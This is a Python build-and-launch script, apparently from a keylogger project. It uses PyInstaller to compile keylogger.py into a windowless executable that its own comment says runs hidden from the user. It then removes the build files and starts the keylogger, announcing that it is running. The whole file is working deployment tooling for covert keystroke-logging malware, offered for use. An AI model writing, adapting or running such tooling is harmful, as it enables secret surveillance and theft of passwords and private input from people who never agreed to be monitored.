import os
import shutil
import subprocess

try:
    import PyInstaller
except:
    print("Pyinstaller not installed properly")
    exit()

if __name__ == "__main__":
    try:
        # converts python script to a .exe application which runs as a background process hidden from the user
        with open(os.devnull, 'wb') as devnull:
            subprocess.check_call("pyinstaller --onefile -w "
                                  "--distpath ./ "
                                  "--specpath Keylogger/build "
                                  "--workpath Keylogger/build "
                                  "keylogger.py".split(" "))
    except Exception as e:
        print(e)
        print("Check the python code is correct and PyInstaller is properly installed")
        exit()

    # removes folders required for the conversion now that it is finished building
    shutil.rmtree("Keylogger/build")

    # start the keylogger!
    os.startfile(os.path.abspath("keylogger.exe"))
    print("keylogger is now running!")